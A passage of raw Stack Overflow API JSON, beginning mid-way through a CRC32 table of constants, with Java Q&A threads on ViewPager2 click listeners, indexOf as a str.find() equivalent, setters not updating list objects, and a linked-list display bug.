     0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,\n            0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856,\n            0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9,\n            0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4,\n            0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,\n            0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3,\n            0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A,\n            0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599,\n            0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,\n            0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190,\n            0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F,\n            0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E,\n            0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,\n            0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED,\n            0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950,\n            0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3,\n            0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,\n            0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A,\n            0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5,\n            0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010,\n            0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,\n            0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17,\n            0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B6,\n            0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615,\n            0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,\n            0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344,\n            0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB,\n            0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A,\n            0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,\n            0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1,\n            0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C,\n            0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF,\n            0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,\n            0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE,\n            0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31,\n            0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C,\n            0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,\n            0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B,\n            0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242,\n            0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1,\n            0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,\n            0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 0xA00AE278,\n            0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7,\n            0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66,\n            0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,\n            0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605,\n            0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8,\n            0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B,\n            0x2D02EF8D\n        };\n</code></pre>\n"},{"tags":["java","android"],"comments":[{"owner":{"account_id":933696,"reputation":995,"user_id":963038,"accept_rate":75,"display_name":"Md. Tahmid Mozaffar"},"score":0,"creation_date":1602966321,"post_id":64406926,"comment_id":113888695,"body_markdown":"Check this. This should work. https://stackoverflow.com/a/55881654/963038","body":"Check this. This should work. <a href=\"https://stackoverflow.com/a/55881654/963038\">stackoverflow.com/a/55881654/963038</a>"}],"answers":[{"tags":[],"owner":{"account_id":20955321,"reputation":221,"user_id":15395983,"display_name":"Manav Adhyaru"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640266254,"creation_date":1640266254,"answer_id":70462814,"question_id":64406926,"body_markdown":"After initialising the view add this **yourPager.setUserInputEnabled(false);**\r\nI face same issue by adding this line i am able to perform longClickAction on viewPager","title":"How to add click/long click listener to ViewPager2","body":"<p>After initialising the view add this <strong>yourPager.setUserInputEnabled(false);</strong>\nI face same issue by adding this line i am able to perform longClickAction on viewPager</p>\n"}],"owner":{"account_id":9575852,"reputation":42,"user_id":13684332,"display_name":"Paprika"},"comment_count":1,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":420,"favorite_count":0,"down_vote_count":0,"up_vote_count":1,"answer_count":1,"score":1,"last_activity_date":1640266254,"creation_date":1602965917,"question_id":64406926,"body_markdown":"I moved from `ViewPager` to `ViewPager2`. Since there&#39;s no way to set a clickable callback to `ViewPager2` or extend it to be clickable, I did this:\r\n\r\n\r\n    public class ViewPagerFragment extends Fragment {\r\n        ViewPager2 viewPagerTop;\r\n        ViewPager2Adapter viewPager2TopAdapter;\r\n        ClickableListener topClickableListener;\r\n    \r\n        public interface ClickableListener {\r\n            public void on(int position);\r\n            public boolean onLong(int position);\r\n        }\r\n    \r\n        public void setOnClickTop(ClickableListener clickableListener) {\r\n            topClickableListener = clickableListener;\r\n        }\r\n    \r\n        @Override\r\n        public View onCreateView(LayoutInflater inflater, ViewGroup container,\r\n                                 Bundle savedInstanceState) {\r\n            View view = inflater.inflate(R.layout.fragment_view_pager, container, false);\r\n            viewPagerTop = view.findViewById(R.id.viewPagerTop);\r\n    \r\n            viewPagerTop.setOnLongClickListener(v -&gt; {\r\n                Log.d(&quot;AAA&quot;, &quot;long clicked!&quot;);\r\n                int position = viewPagerTop.getCurrentItem();\r\n                return topClickableListener.onLong(position);\r\n            });\r\n            viewPagerTop.setOnClickListener(v -&gt; {\r\n                Log.d(&quot;AAA&quot;, &quot;clicked!&quot;);\r\n                int position = viewPagerTop.getCurrentItem();\r\n                topClickableListener.on(position);\r\n            });\r\n\r\nbut it won&#39;t work. I see nothing on log.","title":"How to add click/long click listener to ViewPager2","body":"<p>I moved from <code>ViewPager</code> to <code>ViewPager2</code>. Since there's no way to set a clickable callback to <code>ViewPager2</code> or extend it to be clickable, I did this:</p>\n<pre><code>public class ViewPagerFragment extends Fragment {\n    ViewPager2 viewPagerTop;\n    ViewPager2Adapter viewPager2TopAdapter;\n    ClickableListener topClickableListener;\n\n    public interface ClickableListener {\n        public void on(int position);\n        public boolean onLong(int position);\n    }\n\n    public void setOnClickTop(ClickableListener clickableListener) {\n        topClickableListener = clickableListener;\n    }\n\n    @Override\n    public View onCreateView(LayoutInflater inflater, ViewGroup container,\n                             Bundle savedInstanceState) {\n        View view = inflater.inflate(R.layout.fragment_view_pager, container, false);\n        viewPagerTop = view.findViewById(R.id.viewPagerTop);\n\n        viewPagerTop.setOnLongClickListener(v -&gt; {\n            Log.d(&quot;AAA&quot;, &quot;long clicked!&quot;);\n            int position = viewPagerTop.getCurrentItem();\n            return topClickableListener.onLong(position);\n        });\n        viewPagerTop.setOnClickListener(v -&gt; {\n            Log.d(&quot;AAA&quot;, &quot;clicked!&quot;);\n            int position = viewPagerTop.getCurrentItem();\n            topClickableListener.on(position);\n        });\n</code></pre>\n<p>but it won't work. I see nothing on log.</p>\n"},{"tags":["java","c++"],"comments":[{"owner":{"account_id":1085259,"reputation":78314,"user_id":1081110,"display_name":"Dawood ibn Kareem"},"score":3,"creation_date":1416252301,"post_id":26980349,"comment_id":42494817,"body_markdown":"Use the [Javadocs](https://docs.oracle.com/javase/7/docs/api/java/lang/String.html).  You seek `indexOf` with an extra `int` argument.","body":"Use the <a href=\"https://docs.oracle.com/javase/7/docs/api/java/lang/String.html\" rel=\"nofollow noreferrer\">Javadocs</a>.  You seek <code>indexOf</code> with an extra <code>int</code> argument."},{"owner":{"account_id":398383,"reputation":12130,"user_id":763029,"accept_rate":88,"display_name":"Caffeinated"},"score":1,"creation_date":1416252379,"post_id":26980349,"comment_id":42494860,"body_markdown":"indexOf - http://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0CCAQFjAA&amp;url=http%3A%2F%2Fwww.tutorialspoint.com%2Fjava%2Fjava_string_indexof.htm&amp;ei=0UtqVKj8BIS0yAS_tYHgBQ&amp;usg=AFQjCNFiQz60cf8NfeC7rHjF8k8E99Ra1g&amp;sig2=_YR1DV3DysNQaAWWwvWRUA&amp;bvm=bv.79142246,d.aWw","body":"indexOf - <a href=\"http://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=1&amp;cad=rja&amp;uact=8&amp;ved=0CCAQFjAA&amp;url=http%3A%2F%2Fwww.tutorialspoint.com%2Fjava%2Fjava_string_indexof.htm&amp;ei=0UtqVKj8BIS0yAS_tYHgBQ&amp;usg=AFQjCNFiQz60cf8NfeC7rHjF8k8E99Ra1g&amp;sig2=_YR1DV3DysNQaAWWwvWRUA&amp;bvm=bv.79142246,d.aWw\" rel=\"nofollow noreferrer\">google.com/&hellip;</a>"},{"owner":{"account_id":1821777,"reputation":6462,"user_id":1655674,"display_name":"Dave Doknjas"},"score":0,"creation_date":1416254097,"post_id":26980349,"comment_id":42495739,"body_markdown":"In addition to using &#39;indexOf&#39;, string::npos is defined in C++ as the integer constant -1.","body":"In addition to using &#39;indexOf&#39;, string::npos is defined in C++ as the integer constant -1."}],"answers":[{"tags":[],"owner":{"account_id":4343376,"reputation":1165,"user_id":3546071,"display_name":"haley"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1416252508,"creation_date":1416252508,"answer_id":26980420,"question_id":26980349,"body_markdown":"you can use str.indexOf(&#39;some string&#39;, indexToStartLooking); which will find the first occurrence of &quot;some string&quot; after the int in the second parameter and will return an int. ","title":"str.find() equivalent in java?","body":"<p>you can use str.indexOf('some string', indexToStartLooking); which will find the first occurrence of \"some string\" after the int in the second parameter and will return an int. </p>\n"},{"tags":[],"owner":{"account_id":2120733,"reputation":444,"user_id":1884030,"accept_rate":100,"display_name":"techguy18985"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1416253104,"creation_date":1416253104,"answer_id":26980565,"question_id":26980349,"body_markdown":"Try using Java&#39;s Pattern and Matcher. Those classes involve regex pattern matching. It is very easy. Search here for other existing posts on that subject.","title":"str.find() equivalent in java?","body":"<p>Try using Java's Pattern and Matcher. Those classes involve regex pattern matching. It is very easy. Search here for other existing posts on that subject.</p>\n"}],"owner":{"account_id":4878585,"reputation":89,"user_id":3932977,"accept_rate":67,"display_name":"Will"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":2423,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1640266207,"creation_date":1416252274,"question_id":26980349,"body_markdown":"Hi I&#39;m trying to learn java so I&#39;m converting my working c++ code to java. But I&#39;m unsure about how to proceed with str.find(). Is there an equivalent of this in java? What I want to happen is I look for the first occurrence of a string in another string after the first comma not integer. I know of indexOf() and indexLastOf but they will only produce the fist and last occurrences.          \r\n\r\n    void found() {\r\n        int count = 1;\r\n    \tsize_t find = str.find(&#39;,&#39;); \r\n            while (find != string::npos) {\r\n                count++;\r\n                find = str.find(&#39;,&#39;, find + 1);\r\n        \t}\r\n         }\r\n    };\r\n","title":"str.find() equivalent in java?","body":"<p>Hi I'm trying to learn java so I'm converting my working c++ code to java. But I'm unsure about how to proceed with str.find(). Is there an equivalent of this in java? What I want to happen is I look for the first occurrence of a string in another string after the first comma not integer. I know of indexOf() and indexLastOf but they will only produce the fist and last occurrences.          </p>\n\n<pre><code>void found() {\n    int count = 1;\n    size_t find = str.find(','); \n        while (find != string::npos) {\n            count++;\n            find = str.find(',', find + 1);\n        }\n     }\n};\n</code></pre>\n"},{"tags":["java","arraylist","set","setter"],"comments":[{"owner":{"account_id":11653484,"reputation":12724,"user_id":8534008,"display_name":"GBlodgett"},"score":0,"creation_date":1557948976,"post_id":56156453,"comment_id":98942074,"body_markdown":"You&#39;re just creating a new `Contact` object that&#39;s only in scope within the method. It looks like you&#39;re shadowing a variable","body":"You&#39;re just creating a new <code>Contact</code> object that&#39;s only in scope within the method. It looks like you&#39;re shadowing a variable"},{"owner":{"account_id":4146553,"reputation":32805,"user_id":5743988,"accept_rate":67,"display_name":"4castle"},"score":0,"creation_date":1557949190,"post_id":56156453,"comment_id":98942158,"body_markdown":"Use `currentContact = contact;` so that the returned object reference is the one in the list.","body":"Use <code>currentContact = contact;</code> so that the returned object reference is the one in the list."},{"owner":{"display_name":"user9664805"},"score":0,"creation_date":1557949514,"post_id":56156453,"comment_id":98942283,"body_markdown":"Everything works, thanks!","body":"Everything works, thanks!"}],"answers":[{"tags":[],"owner":{"account_id":9749460,"reputation":683,"user_id":7228218,"display_name":"Islam Hassan"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1557949278,"creation_date":1557949278,"answer_id":56156544,"question_id":56156453,"body_markdown":"Your findContact() method is not returning a reference to a Contact object in the ArrayList, instead you are creating a new object with a copy of the data and then returning it.\r\n\r\nChange it as follows and your first approach should work:\r\n\r\n    public Contact findContact(String name) {\r\n\r\n        Contact currentContact = null;\r\n\r\n        for (Contact contact : contacts) {\r\n            if (contact.getName().equals(name)) {\r\n                currentContact = contact;\r\n                break;\r\n            }\r\n        }\r\n\r\n        return currentContact;\r\n    }","title":"Why setter methods don&#39;t update Object?","body":"<p>Your findContact() method is not returning a reference to a Contact object in the ArrayList, instead you are creating a new object with a copy of the data and then returning it.</p>\n\n<p>Change it as follows and your first approach should work:</p>\n\n<pre><code>public Contact findContact(String name) {\n\n    Contact currentContact = null;\n\n    for (Contact contact : contacts) {\n        if (contact.getName().equals(name)) {\n            currentContact = contact;\n            break;\n        }\n    }\n\n    return currentContact;\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":23726981,"reputation":1,"user_id":17746748,"display_name":"Kuldip Patil"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640265914,"creation_date":1640248228,"answer_id":70459491,"question_id":56156453,"body_markdown":"Complete solution by using different class Name..\r\nAbove solutions doesn&#39;t Continued old Data..\r\n```java\r\nSystem.out.println(&quot;Enter Id OF student&quot;);\r\nString inputId = sc.next();\r\nfor(Student std : list ) {\r\n   if(std.getId().equals(inputId)){\r\n     Student newdata = std;\r\n     System.out.println(&quot;Enter New Marks and Phone Number:&quot;);\r\n     Student update = new Student(newdata.getId(),newdata.getCourse(),sc.nextDouble(),sc.next(),newdata.getEmail());\r\n     list.set(list.indexOf(newdata), update);\r\n         break;\r\n  }\r\n}\r\n```","title":"Why setter methods don&#39;t update Object?","body":"<p>Complete solution by using different class Name..\nAbove solutions doesn't Continued old Data..</p>\n<pre class=\"lang-java prettyprint-override\"><code>System.out.println(&quot;Enter Id OF student&quot;);\nString inputId = sc.next();\nfor(Student std : list ) {\n   if(std.getId().equals(inputId)){\n     Student newdata = std;\n     System.out.println(&quot;Enter New Marks and Phone Number:&quot;);\n     Student update = new Student(newdata.getId(),newdata.getCourse(),sc.nextDouble(),sc.next(),newdata.getEmail());\n     list.set(list.indexOf(newdata), update);\n         break;\n  }\n}\n</code></pre>\n"}],"owner":{"display_name":"user9664805"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":1115,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":2,"score":0,"last_activity_date":1640265914,"creation_date":1557948728,"question_id":56156453,"body_markdown":"I want to update the Contact object, which has 2 fields - name &amp; phoneNumber.\nUnfortunately I don&#39;t know why setter methods don&#39;t work. \n\nFirstly I tried with the ```#1``` version of updateContact() method - code below. \nI think that it may have something with updating reference of an object, not the object itself? I&#39;m not sure. \n\nIf anybody could explain me that, why the code with setters doesn&#39;t work... - I mean it updates the &#39;contact&#39; within the function, but doesn&#39;t update contact in the ArrayList - contacts.\n\nThe ```#2``` method works, but I&#39;m not sure if it&#39;s a good idea/solution - well, it works... but I think that with setters it should work as well.  \n\n# 1\n```\n    public void updateContact(String name) {\n\n        Contact contact = findContact(name);\n\n        System.out.print(&quot;Enter new name: &quot;);\n        contact.setName(scanner.nextLine());\n\n        System.out.print(&quot;Enter new phone number (9 numbers): &quot;);\n        contact.setPhoneNumber(scanner.nextLine());\n    }\n```\n# 2\n```\n    public void updateContact(String name) {\n\n        Contact contact = findContact(name);\n\n        String replaceName;\n        String replaceNumber;\n\n        System.out.print(&quot;Enter new name: &quot;);\n        replaceName = scanner.nextLine();\n\n        System.out.print(&quot;Enter new phone number (9 numbers): &quot;);\n        replaceNumber = scanner.nextLine();\n\n        Contact replace = new Contact(replaceName, replaceNumber);\n\n        contacts.set(contacts.indexOf(contact), replace);\n    }\n```\nfindContact method\n```\n    public Contact findContact(String name) {\n\n        Contact currentContact = null;\n\n        for (Contact contact : contacts) {\n            if (contact.getName().equals(name)) {\n                currentContact = new Contact(name, contact.getPhoneNumber());\n            }\n        }\n\n        return currentContact;\n    }\n```\n\nThanks for help in advance.","title":"Why setter methods don&#39;t update Object?","body":"<p>I want to update the Contact object, which has 2 fields - name &amp; phoneNumber.\nUnfortunately I don't know why setter methods don't work.</p>\n<p>Firstly I tried with the <code>#1</code> version of updateContact() method - code below.\nI think that it may have something with updating reference of an object, not the object itself? I'm not sure.</p>\n<p>If anybody could explain me that, why the code with setters doesn't work... - I mean it updates the 'contact' within the function, but doesn't update contact in the ArrayList - contacts.</p>\n<p>The <code>#2</code> method works, but I'm not sure if it's a good idea/solution - well, it works... but I think that with setters it should work as well.</p>\n<h1>1</h1>\n<pre><code>    public void updateContact(String name) {\n\n        Contact contact = findContact(name);\n\n        System.out.print(&quot;Enter new name: &quot;);\n        contact.setName(scanner.nextLine());\n\n        System.out.print(&quot;Enter new phone number (9 numbers): &quot;);\n        contact.setPhoneNumber(scanner.nextLine());\n    }\n</code></pre>\n<h1>2</h1>\n<pre><code>    public void updateContact(String name) {\n\n        Contact contact = findContact(name);\n\n        String replaceName;\n        String replaceNumber;\n\n        System.out.print(&quot;Enter new name: &quot;);\n        replaceName = scanner.nextLine();\n\n        System.out.print(&quot;Enter new phone number (9 numbers): &quot;);\n        replaceNumber = scanner.nextLine();\n\n        Contact replace = new Contact(replaceName, replaceNumber);\n\n        contacts.set(contacts.indexOf(contact), replace);\n    }\n</code></pre>\n<p>findContact method</p>\n<pre><code>    public Contact findContact(String name) {\n\n        Contact currentContact = null;\n\n        for (Contact contact : contacts) {\n            if (contact.getName().equals(name)) {\n                currentContact = new Contact(name, contact.getPhoneNumber());\n            }\n        }\n\n        return currentContact;\n    }\n</code></pre>\n<p>Thanks for help in advance.</p>\n"},{"tags":["java","data-structures","linked-list"],"answers":[{"tags":[],"owner":{"account_id":13429972,"reputation":1807,"user_id":9690075,"display_name":"zysaaa"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1639720758,"creation_date":1639713666,"answer_id":70388288,"question_id":70388067,"body_markdown":"The display method is wrong, ```head``` will become the ```tail``` node. Use a temp node:\r\n\r\n```\r\n    public void display() {\r\n        NodeList tmp = head;\r\n        if (tmp != null) {\r\n            while (tmp != null) {\r\n                System.out.print(tmp.getData() + &quot; &quot;);\r\n                tmp = tmp.getLink();\r\n            }\r\n            System.out.println();\r\n        }\r\n    }\r\n```\r\n\r\nEdit: my test code:\r\n\r\n```\r\npublic class NodeList {\r\n\r\n    private NodeList Link;\r\n    private int data;\r\n\r\n    public NodeList(int data) {\r\n        this.Link = null;\r\n        this.data = data;\r\n    }\r\n\r\n    public NodeList() {\r\n    }\r\n\r\n\r\n    public NodeList getLink() {\r\n        return Link;\r\n    }\r\n\r\n    public void setLink(NodeList Link) {\r\n        this.Link = Link;\r\n    }\r\n\r\n    public int getData() {\r\n        return this.data;\r\n    }\r\n\r\n    public void setData(int data) {\r\n        this.data = data;\r\n    }\r\n\r\n    NodeList head;\r\n\r\n    public void insert(int insertKey) {\r\n        NodeList myhead = new NodeList();\r\n        if (head == null) {\r\n            myhead.setData(insertKey);\r\n        } else {\r\n            myhead.setData(insertKey);\r\n            myhead.setLink(head);\r\n\r\n        }\r\n        head = myhead;\r\n    }\r\n    public boolean search(int key) {\r\n\r\n        boolean check = false;\r\n        NodeList current = head;\r\n        while (current != null) {\r\n            if (current.getData() == key) {\r\n                check = true;\r\n                break;\r\n            }\r\n            current = current.getLink();\r\n\r\n        }\r\n        return check;\r\n    }\r\n    public void display() {\r\n        NodeList tmp = head;\r\n        if (tmp != null) {\r\n            while (tmp != null) {\r\n                System.out.print(tmp.getData() + &quot; &quot;);\r\n                tmp = tmp.getLink();\r\n            }\r\n            System.out.println();\r\n        }\r\n    }\r\n\r\n    public static void main(String[] args) {\r\n        NodeList Linkedlist = new NodeList();\r\n        Linkedlist.insert(3);\r\n        Linkedlist.insert(13);\r\n        Linkedlist.insert(43);\r\n        Linkedlist.insert(33);\r\n        Linkedlist.insert(43);\r\n        Linkedlist.insert(43);\r\n        Linkedlist.display();\r\n        boolean check=Linkedlist.search(43);\r\n        System.out.println(&quot;check: &quot; + check);\r\n    }\r\n\r\n}\r\n```","title":"How to fix Linked List implementation problem?","body":"<p>The display method is wrong, <code>head</code> will become the <code>tail</code> node. Use a temp node:</p>\n<pre><code>    public void display() {\n        NodeList tmp = head;\n        if (tmp != null) {\n            while (tmp != null) {\n                System.out.print(tmp.getData() + &quot; &quot;);\n                tmp = tmp.getLink();\n            }\n            System.out.println();\n        }\n    }\n</code></pre>\n<p>Edit: my test code:</p>\n<pre><code>public class NodeList {\n\n    private NodeList Link;\n    private int data;\n\n    public NodeList(int data) {\n        this.Link = null;\n        this.data = data;\n    }\n\n    public NodeList() {\n    }\n\n\n    public NodeList getLink() {\n        return Link;\n    }\n\n    public void setLink(NodeList Link) {\n        this.Link = Link;\n    }\n\n    public int getData() {\n        return this.data;\n    }\n\n    public void setData(int data) {\n        this.data = data;\n    }\n\n    NodeList head;\n\n    public void insert(int insertKey) {\n        NodeList myhead = new NodeList();\n        if (head == null) {\n            myhead.setData(insertKey);\n        } else {\n            myhead.setData(insertKey);\n            myhead.setLink(head);\n\n        }\n        head = myhead;\n    }\n    public boolean search(int key) {\n\n        boolean check = false;\n        NodeList current = head;\n        while (current != null) {\n            if (current.getData() == key) {\n                check = true;\n                break;\n            }\n            current = current.getLink();\n\n        }\n        return check;\n    }\n    public void display() {\n        NodeList tmp = head;\n        if (tmp != null) {\n            while (tmp != null) {\n                System.out.print(tmp.getData() + &quot; &quot;);\n                tmp = tmp.getLink();\n            }\n            System.out.println();\n        }\n    }\n\n    public static void main(String[] args) {\n        NodeList Linkedlist = new NodeList();\n        Linkedlist.insert(3);\n        Linkedlist.insert(13);\n        Linkedlist.insert(43);\n        Linkedlist.insert(33);\n        Linkedlist.insert(43);\n        Linkedlist.insert(43);\n        Linkedlist.display();\n        boolean check=Linkedlist.search(43);\n        System.out.println(&quot;check: &quot; + check);\n    }\n\n}\n</code></pre>\n"}],"owner":{"account_id":23444851,"reputation":3,"user_id":17501798,"display_name":"01d"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":84,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640265388,"creation_date":1639711528,"question_id":70388067,"body_markdown":"I&#39;m think inserting values correctly also I can view on console screen however search method does not work at weird  way\r\n\r\nWhat is the missing all my code ? it pretty clear and basic structure \r\n\r\nat the output part  &quot;43&quot; normally include on structure it need to show true but probably it does not working  I dont know reason.\r\noutput:\r\n43 43 33 43 13 3 \r\ncheck: false\r\n```java\r\n NodeList head;\r\n\r\n    public void insert(int insertKey) {\r\n        NodeList myhead = new NodeList();\r\n        if (head == null) {\r\n            myhead.setData(insertKey);\r\n        } else {\r\n            myhead.setData(insertKey);\r\n            myhead.setLink(head);\r\n           \r\n        }\r\n            head = myhead;\r\n    }\r\n    public boolean search(int key) {\r\n\r\n        boolean check = false;\r\n        NodeList current = head;\r\n        while (current != null) {\r\n            if (current.getData() == key) {\r\n                check = true;\r\n                break;\r\n            }\r\n            current = current.getLink();\r\n\r\n        }\r\n        return check;\r\n    }\r\n\r\npublic void display() {\r\n        if (head == null) {\r\n        } else {\r\n            while (head != null) {\r\n                System.out.print(head.getData() + &quot; &quot;);\r\n                head = head.getLink();\r\n            }\r\n            System.out.println();\r\n        }\r\n    }\r\n\r\n\r\n\r\npackage ds_project;\r\n\r\npublic class NodeList {\r\n\r\n    private NodeList Link;\r\n    private int data;\r\n\r\n    public NodeList(int data) {\r\n        this.Link = null;\r\n        this.data = data;\r\n    }\r\n\r\n    public NodeList() {\r\n    }\r\n\r\n\r\n    public NodeList getLink() {\r\n        return Link;\r\n    }\r\n\r\n    public void setLink(NodeList Link) {\r\n        this.Link = Link;\r\n    }\r\n\r\n    public int getData() {\r\n        return this.data;\r\n    }\r\n\r\n    public void setData(int data) {\r\n        this.data = data;\r\n    }\r\n\r\nresult screen\r\n  SLL Linkedlist = new SLL();\r\n        Linkedlist.insert(3);\r\n        Linkedlist.insert(13);\r\n        Linkedlist.insert(43);\r\n        Linkedlist.insert(33);\r\n        Linkedlist.insert(43);\r\n        Linkedlist.insert(43);\r\n        Linkedlist.display();\r\n        boolean check=Linkedlist.search(43);\r\n        System.out.println(&quot;check: &quot; + check);}\r\n```\r\n\r\n output: \r\n 43 43 33 43 13 3 check: false","title":"How to fix Linked List implementation problem?","body":"<p>I'm think inserting values correctly also I can view on console screen however search method does not work at weird  way</p>\n<p>What is the missing all my code ? it pretty clear and basic structure</p>\n<p>at the output part  &quot;43&quot; normally include on structure it need to show true but probably it does not working  I dont know reason.\noutput:\n43 43 33 43 13 3\ncheck: false</p>\n<pre class=\"lang-java prettyprint-override\"><code> NodeList head;\n\n    public void insert(int insertKey) {\n        NodeList myhead = new NodeList();\n        if (head == null) {\n            myhead.setData(insertKey);\n        } else {\n            myhead.setData(insertKey);\n            myhead.setLink(head);\n           \n        }\n            head = myhead;\n    }\n    public boolean search(int key) {\n\n        boolean check = false;\n        NodeList current = head;\n        while (current != null) {\n            if (current.getData() == key) {\n                check = true;\n                break;\n            }\n            current = current.getLink();\n\n        }\n        return check;\n    }\n\npublic void display() {\n        if (head == null) {\n        } else {\n            while (head != null) {\n                System.out.print(head.getData() + &quot; &quot;);\n                head = head.getLink();\n            }\n            System.out.println();\n        }\n    }\n\n\n\npackage ds_project;\n\npublic class NodeList {\n\n    private NodeList Link;\n    private int data;\n\n    public NodeList(int data) {\n        this.Link = null;\n        this.data = data;\n    }\n\n    public NodeList() {\n    }\n\n\n    public NodeList getLink() {\n        return Link;\n    }\n\n    public void setLink(NodeList Link) {\n        this.Link = Link;\n    }\n\n    public int getData() {\n        return this.data;\n    }\n\n    public void setData(int data) {\n        this.data = data;\n    }\n\nresult screen\n  SLL Linkedlist = new SLL();\n        Linkedlist.insert(3);\n        Linkedlist.insert(13);\n        Linkedlist.insert(43);\n        Linkedlist.insert(33);\n        Linkedlist.insert(43);\n        Linkedlist.insert(43);\n        Linkedlist.display();\n        boolean check=Linkedlist.search(43);\n        System.out.println(&quot;check: &quot; + check);}\n</code></pre>\n<p>output:\n43 43 33 43 13 3 check: false</p>\n"},{"tags":["java"],"comments":[{"owner":{"account_id":6520,"reputation":10523,"user_id":11002,"accept_rate":75,"display_name":"tgdavies"},"score":2,"creation_date":1640262665,"post_id":70462127,"comment_id":124555797,"body_markdown":"What sort of &quot;error object&quot;. Please edit your question to show an example of an error as shown on your Java console.","body":"What sort of &quot;error object&quot;. Please edit your question to show an example of an error as shown on your Java console."},{"owner":{"account_id":8362430,"reputation":856,"user_id":6280255,"display_name":"Just another Java programmer"},"score":1,"creation_date":1640264189,"post_id":70462127,"comment_id":124556304,"body_markdown":"Does this help: https://stackoverflow.com/questions/7242596/e-printstacktrace-in-string","body":"Does this help: <a 